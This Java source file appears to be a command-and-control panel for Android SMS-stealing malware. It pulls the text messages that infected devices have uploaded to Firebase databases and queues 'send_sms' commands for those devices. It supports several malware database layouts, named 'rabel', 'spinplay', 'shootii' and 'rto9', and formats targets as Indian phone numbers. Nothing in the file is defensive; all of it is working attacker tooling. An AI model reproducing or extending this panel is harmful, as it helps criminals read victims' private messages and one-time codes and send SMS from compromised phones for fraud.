package com.nya.panel;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.regex.Pattern;

final class RebelPanelApi {

    private static final String[] DEVICE_NODES = {
            "clients", "devices", "devices_status", "Verify_Device", "user_list", "user_data",
            "users", "All_Users", "All_User", "AllClients", "all_clients",
            "online_devices", "online_users", "clients_list", "client_list", "online_status",
            "device_list", "devices_list", "device_data", "registered_users", "active_devices",
            "active_users", "connected_devices", "device_status",
    };

    private static final String[] SMS_SUFFIXES = {
            "all_sms", "new_sms", "sms", "messages", "sms_inbox", "inbox",
            "received_sms", "sent_sms", "sms_list", "user_sms", "msg_list",
    };

    private static final String[] SMS_GLOBAL_NODES = {
            "messages", "user_sms", "sms", "all_sms", "new_sms", "sms_inbox", "inbox",
            "received_sms", "sent_sms", "sms_data", "device_sms", "client_sms", "sms_logs",
            "msg_store", "text_messages", "sms_backup",
    };

    private RebelPanelApi() {
    }

    static JSONObject sendSms(JSONObject body) {
        try {
            String deviceId = trim(body.optString("device_id"));
            String to = formatSmsTo(body.optString("to"));
            String message = trim(body.optString("message"));
            int sim = Math.max(1, body.optInt("sim", 1));
            String url = rtrim(trim(body.optString("database_url")), '/');
            String authKey = trim(body.optString("auth_key"));
            String schema = trim(body.optString("schema", "rabel"));
            String deviceNode = trim(body.optString("device_node", "clients"));

            if (deviceId.isEmpty() || to.isEmpty() || message.isEmpty()) {
                return error("Device, number and message required");
            }
            if (url.isEmpty()) {
                return error("Firebase URL missing");
            }

            List<SendAttempt> attempts = sendPathsForDevice(deviceId, schema, deviceNode, url);
            String lastError = "Failed to send SMS — device offline or Firebase error";

            for (SendAttempt attempt : attempts) {
                JSONObject payload = sendPayloadForType(attempt.type, sim, to, message, deviceId);
                String method = attempt.method != null && !attempt.method.isEmpty()
                        ? attempt.method : "PUT";
                JSONObject res = RebelFirebaseClient.request(method, url, authKey, attempt.path, payload);
                if (res != null) {
                    String hint = "rto9".equals(attempt.type)
                            ? " Command queued — device must be online on APK to send."
                            : "";
                    JSONObject out = new JSONObject();
                    out.put("ok", true);
                    out.put("message", "SMS command sent to device" + hint);
                    out.put("sim", sim);
                    out.put("to", to);
                    out.put("path", attempt.path);
                    out.put("schema", attempt.type);
                    return out;
                }
                lastError = "Failed via " + attempt.path;
            }
            return error(lastError);
        } catch (Exception e) {
            return error(e.getMessage() == null ? "Send failed" : e.getMessage());
        }
    }

    static JSONObject fetchSms(JSONObject body) {
        try {
            String deviceId = trim(body.optString("device_id"));
            String url = rtrim(trim(body.optString("database_url")), '/');
            String authKey = trim(body.optString("auth_key"));
            String schema = trim(body.optString("schema", "rabel"));
            String deviceNode = trim(body.optString("device_node", "clients"));

            if (deviceId.isEmpty()) {
                return error("Device id required");
            }
            if (url.isEmpty()) {
                return error("Firebase URL missing");
            }

            List<JSONObject> all = new ArrayList<>();
            for (String path : smsPathsForDevice(deviceId, schema, deviceNode)) {
                JSONObject data = RebelFirebaseClient.request("GET", url, authKey, path, null);
                if (data == null) {
                    continue;
                }
                List<JSONObject> batch = new ArrayList<>();
                smsAsList(data, batch);
                if (batch.isEmpty()) {
                    continue;
                }
                all = mergeSmsLists(all, batch);
            }

            JSONArray messages = new JSONArray();
            for (JSONObject item : all) {
                messages.put(item);
            }
            JSONObject out = new JSONObject();
            out.put("ok", true);
            out.put("messages", messages);
            out.put("count", messages.length());
            out.put("schema", schema);
            return out;
        } catch (Exception e) {
            return error(e.getMessage() == null ? "Fetch failed" : e.getMessage());
        }
    }

    private static List<String> smsPathsForDevice(String deviceId, String schema, String deviceNode) {
        String id = trim(deviceId);
        if (id.isEmpty()) {
            return new ArrayList<>();
        }

        String node = deviceNode.isEmpty() ? "clients" : deviceNode;
        Set<String> bases = new LinkedHashSet<>();
        bases.add(node);
        bases.addAll(Arrays.asList(DEVICE_NODES));

        LinkedHashSet<String> paths = new LinkedHashSet<>();
        for (String global : SMS_GLOBAL_NODES) {
            paths.add(global + "/" + id);
        }

        if ("shootii".equals(schema)) {
            for (String n : unique("Verify_Device", node, "clients", "devices")) {
                if (n.isEmpty()) {
                    continue;
                }
                for (String sfx : SMS_SUFFIXES) {
                    paths.add(n + "/" + id + "/" + sfx);
                }
            }
            return new ArrayList<>(paths);
        }

        if ("spinplay".equals(schema)) {
            LinkedHashSet<String> preferred = new LinkedHashSet<>();
            for (String n : unique("devices", "devices_status", node, "clients")) {
                if (n.isEmpty()) {
                    continue;
                }
                for (String sfx : new String[]{"all_sms", "new_sms", "sms", "messages"}) {
                    preferred.add(n + "/" + id + "/" + sfx);
                }
            }
            preferred.add("messages/" + id);
            return new ArrayList<>(preferred);
        }

        if ("rabel".equals(schema) || "user_list".equals(deviceNode) || "user_data".equals(deviceNode)) {
            paths.clear();
            paths.add("user_sms/" + id);
            paths.add("sms_backup/" + id);
            paths.add("messages/" + id);
            paths.add("sms/" + id);
            paths.add("all_sms/" + id);
            paths.add("new_sms/" + id);
            Set<String> junk = new HashSet<>(Arrays.asList(
                    "clients", "users", "data", "sendsms", "sendSms", "smsQueue", "bots", "Admin", "admin"
            ));
            for (String n : bases) {
                if (n.isEmpty() || junk.contains(n)) {
                    continue;
                }
                for (String sfx : new String[]{"all_sms", "new_sms", "sms", "messages"}) {
                    paths.add(n + "/" + id + "/" + sfx);
                }
            }
            return new ArrayList<>(paths);
        }

        for (String n : bases) {
            if (n.isEmpty()) {
                continue;
            }
            for (String sfx : SMS_SUFFIXES) {
                paths.add(n + "/" + id + "/" + sfx);
            }
        }
        return new ArrayList<>(paths);
    }

    private static List<SendAttempt> sendPathsForDevice(
            String deviceId, String schema, String deviceNode, String url
    ) {
        String id = trim(deviceId);
        List<SendAttempt> out = new ArrayList<>();
        if (id.isEmpty()) {
            return out;
        }

        String node = deviceNode.isEmpty() ? "clients" : deviceNode;
        if ("spinplay".equals(schema)) {
            for (String n : unique(node, "devices", "clients", "Verify_Device")) {
                out.add(new SendAttempt(n + "/" + id + "/manual_commands/send_sms", "spinplay", "PUT"));
            }
            out.add(new SendAttempt("clients/" + id + "/webhookEvent/sendSms", "rabel", "PUT"));
            return out;
        }

        if ("shootii".equals(schema)) {
            for (String n : unique("Verify_Device", node, "clients", "devices")) {
                if (n.isEmpty()) {
                    continue;
                }
                out.add(new SendAttempt(n + "/" + id + "/manual_commands/send_sms", "spinplay", "PUT"));
                out.add(new SendAttempt(n + "/" + id + "/webhookEvent/sendSms", "rabel", "PUT"));
                out.add(new SendAttempt(n + "/" + id + "/commands/send_sms", "spinplay", "PUT"));
            }
            return out;
        }

        if ("rabel".equals(schema) || "clients".equals(node)) {
            out.add(new SendAttempt("clients/" + id, "rto9", "PATCH"));
        }

        if (isRtoStyleUrl(url) || "user_list".equals(deviceNode) || "user_data".equals(deviceNode)) {
            out.add(new SendAttempt("clients/" + id, "rto9", "PATCH"));
            out.add(new SendAttempt(id, "rto9", "PATCH"));
            out.add(new SendAttempt("clients/" + id + "/webhookEvent/sendSms", "rabel", "PUT"));
            out.add(new SendAttempt(id + "/webhookEvent/sendSms", "rabel", "PUT"));
        }
        for (String n : unique("clients", node, "user_list", "user_data", "devices")) {
            if (n.isEmpty()) {
                continue;
            }
            out.add(new SendAttempt(n + "/" + id + "/webhookEvent/sendSms", "rabel", "PUT"));
        }
        out.add(new SendAttempt("devices/" + id + "/manual_commands/send_sms", "spinplay", "PUT"));
        return out;
    }

    private static JSONObject sendPayloadForType(
            String type, int sim, String to, String message, String deviceId
    ) throws Exception {
        int slot = Math.max(1, sim);
        if ("spinplay".equals(type)) {
            JSONObject payload = new JSONObject();
            payload.put("to", to);
            payload.put("message", message);
            payload.put("sim", slot - 1);
            return payload;
        }
        if ("rto9".equals(type)) {
            int simSlot = Math.max(0, slot - 1);
            JSONObject payload = new JSONObject();
            payload.put("cmd", "send_sms");
            payload.put("command", "send message");
            payload.put("messageText", message);
            payload.put("msg", message);
            payload.put("phoneNumber", to);
            payload.put("phone", to);
            payload.put("number", to);
            payload.put("to", to);

            JSONObject sendSms = new JSONObject();
            sendSms.put("message", message);
            sendSms.put("status", "pending");
            sendSms.put("to", to);
            payload.put("sendSms", sendSms);

            JSONObject sms = new JSONObject();
            sms.put("message", message);
            sms.put("status", "pending");
            sms.put("to", to);
            payload.put("sms", sms);

            payload.put("sim", simSlot);
            payload.put("simSlot", String.valueOf(simSlot));
            payload.put("targetDeviceId", deviceId);
            payload.put("timestamp", System.currentTimeMillis());
            payload.put("webhookEvent", "send_sms");
            return payload;
        }

        JSONObject payload = new JSONObject();
        payload.put("from", slot);
        payload.put("to", to);
        payload.put("message", message);
        payload.put("isSended", false);
        return payload;
    }

    private static void smsAsList(Object raw, List<JSONObject> out) throws Exception {
        if (!(raw instanceof JSONObject)) {
            return;
        }
        JSONObject obj = (JSONObject) raw;
        for (String wrapKey : new String[]{"messages", "sms", "data", "items", "list"}) {
            if (obj.has(wrapKey) && obj.get(wrapKey) instanceof JSONObject) {
                smsAsList(obj.get(wrapKey), out);
                return;
            }
        }

        JSONArray names = obj.names();
        if (names == null) {
            return;
        }

        boolean listLike = true;
        for (int i = 0; i < names.length(); i++) {
            if (!String.valueOf(i).equals(names.optString(i))) {
                listLike = false;
                break;
            }
        }

        if (listLike) {
            for (int i = 0; i < names.length(); i++) {
                Object value = obj.opt(String.valueOf(i));
                if (value instanceof JSONObject) {
                    JSONObject child = (JSONObject) value;
                    if (looksLikeMessage(child)) {
                        JSONObject norm = normalizeSms(child);
                        if (norm != null) {
                            out.add(norm);
                        }
                    } else {
                        smsAsList(child, out);
                    }
                }
            }
            return;
        }

        for (int i = 0; i < names.length(); i++) {
            Object value = obj.opt(names.getString(i));
            if (value instanceof JSONObject) {
                JSONObject child = (JSONObject) value;
                if (looksLikeMessage(child)) {
                    JSONObject norm = normalizeSms(child);
                    if (norm != null) {
                        out.add(norm);
                    }
                } else {
                    smsAsList(child, out);
                }
            }
        }
    }

    private static boolean looksLikeMessage(JSONObject item) {
        String body = firstNonEmpty(
                item.optString("body"),
                item.optString("message"),
                item.optString("text"),
                item.optString("content"),
                item.optString("msg")
        );
        return !body.isEmpty();
    }

    private static JSONObject normalizeSms(JSONObject item) throws Exception {
        if (isOutboundCommand(item)) {
            return null;
        }
        String body = firstNonEmpty(
                item.optString("body"),
                item.optString("message"),
                item.optString("text"),
                item.optString("content"),
                item.optString("msg")
        );
        if (body.isEmpty()) {
            return null;
        }
        if (item.optString("body").isEmpty()
                && !item.optString("message").isEmpty()
                && !item.optString("to").isEmpty()
                && !item.optString("status").isEmpty()
                && item.optString("sender").isEmpty()) {
            return null;
        }

        long ts = smsMsgTime(item);
        JSONObject out = new JSONObject();
        out.put("address", firstNonEmpty(
                item.optString("address"),
                item.optString("sender"),
                item.optString("from"),
                item.optString("number"),
                item.optString("originatingAddress"),
                "?"
        ));
        out.put("body", body);
        out.put("date_readable", firstNonEmpty(
                item.optString("date_readable"),
                item.optString("dateTime"),
                item.optString("date_time"),
                item.optString("time"),
                item.optString("date"),
                "—"
        ));
        out.put("type", firstNonEmpty(
                item.optString("type"),
                item.optString("direction"),
                item.optString("sms_type"),
                "inbox"
        ).toLowerCase(Locale.US));
        out.put("ts", ts);
        return out;
    }

    private static boolean isOutboundCommand(JSONObject item) {
        if (!item.optString("sender").isEmpty()
                || !item.optString("address").isEmpty()
                || !item.optString("originatingAddress").isEmpty()) {
            return false;
        }
        if (!item.optString("body").isEmpty()
                && (item.has("sender") || item.has("address"))) {
            return false;
        }
        if (!item.optString("to").isEmpty()
                && !item.optString("status").isEmpty()
                && item.optString("body").isEmpty()
                && (!item.optString("message").isEmpty() || !item.optString("msg").isEmpty())) {
            return true;
        }
        return !item.optString("to").isEmpty()
                && (!item.optString("message").isEmpty() || !item.optString("msg").isEmpty())
                && item.optString("body").isEmpty()
                && item.optString("sender").isEmpty()
                && item.optString("date").isEmpty()
                && item.optString("timestamp").isEmpty();
    }

    private static long smsMsgTime(JSONObject item) {
        String[] keys = {
                "date", "timestamp", "dateTime", "datetime", "time", "received_at", "sent_at",
                "created_at", "receivedAt", "sentAt", "sms_time", "msg_time", "last_modified",
                "received_time", "sent_time", "id"
        };
        for (String key : keys) {
            long ms = smsToMs(item.opt(key));
            if (ms > 0) {
                return ms;
            }
        }
        long sort = smsToMs(item.opt("_sortKey"));
        if (sort > 0) {
            return sort;
        }
        return smsToMs(item.opt("date_readable"));
    }

    private static long smsToMs(Object value) {
        if (value == null || JSONObject.NULL.equals(value)) {
            return 0;
        }
        if (value instanceof Number) {
            long n = ((Number) value).longValue();
            if (n <= 0) {
                return 0;
            }
            return n < 1_000_000_000_000L ? n * 1000L : n;
        }
        String text = String.valueOf(value).trim();
        if (text.isEmpty()) {
            return 0;
        }
        if (text.matches("^\\d+(\\.\\d+)?$")) {
            double n = Double.parseDouble(text);
            if (n <= 0) {
                return 0;
            }
            return n < 1_000_000_000_000d ? (long) (n * 1000d) : (long) n;
        }
        return 0;
    }

    private static List<JSONObject> mergeSmsLists(List<JSONObject> first, List<JSONObject> second)
            throws Exception {
        Map<String, JSONObject> merged = new LinkedHashMap<>();
        for (JSONObject item : first) {
            merged.put(smsKey(item), item);
        }
        for (JSONObject item : second) {
            merged.put(smsKey(item), item);
        }
        return new ArrayList<>(merged.values());
    }

    private static String smsKey(JSONObject item) {
        String body = item.optString("body");
        String snippet = body.length() > 80 ? body.substring(0, 80) : body;
        return item.optString("address", "?") + "|" + item.optLong("ts") + "|" + snippet;
    }

    private static boolean isRtoStyleUrl(String url) {
        return Pattern.compile("rto9|rto0|rto91", Pattern.CASE_INSENSITIVE).matcher(url).find();
    }

    private static String formatSmsTo(String raw) {
        String clean = raw.replaceAll("\\D", "");
        if (clean.length() == 10) {
            return "91" + clean;
        }
        if (clean.length() == 12 && clean.startsWith("91")) {
            return clean;
        }
        if (clean.length() > 10) {
            return "91" + clean.substring(clean.length() - 10);
        }
        return clean;
    }

    private static String normalizePhone(String raw) {
        String clean = raw.replaceAll("\\D", "");
        if (clean.length() == 10) {
            return clean;
        }
        if (clean.length() > 10 && clean.startsWith("91")) {
            return clean.substring(clean.length() - 10);
        }
        return clean;
    }

    private static List<String> unique(String... values) {
        LinkedHashSet<String> set = new LinkedHashSet<>();
        for (String value : values) {
            if (value != null && !value.isEmpty()) {
                set.add(value);
            }
        }
        return new ArrayList<>(set);
    }

    private static String trim(String value) {
        return value == null ? "" : value.trim();
    }

    private static String rtrim(String value, char ch) {
        if (value == null) {
            return "";
        }
        int end = value.length();
        while (end > 0 && value.charAt(end - 1) == ch) {
            end--;
        }
        return value.substring(0, end);
    }

    private static String firstNonEmpty(String... values) {
        for (String value : values) {
            if (value != null && !value.trim().isEmpty()) {
                return value.trim();
            }
        }
        return "";
    }

    private static JSONObject error(String message) {
        JSONObject out = new JSONObject();
        try {
            out.put("ok", false);
            out.put("error", message);
        } catch (Exception ignored) {
        }
        return out;
    }

    private static final class SendAttempt {
        final String path;
        final String type;
        final String method;

        SendAttempt(String path, String type) {
            this(path, type, "PUT");
        }

        SendAttempt(String path, String type, String method) {
            this.path = path;
            this.type = type;
            this.method = method;
        }
    }
}
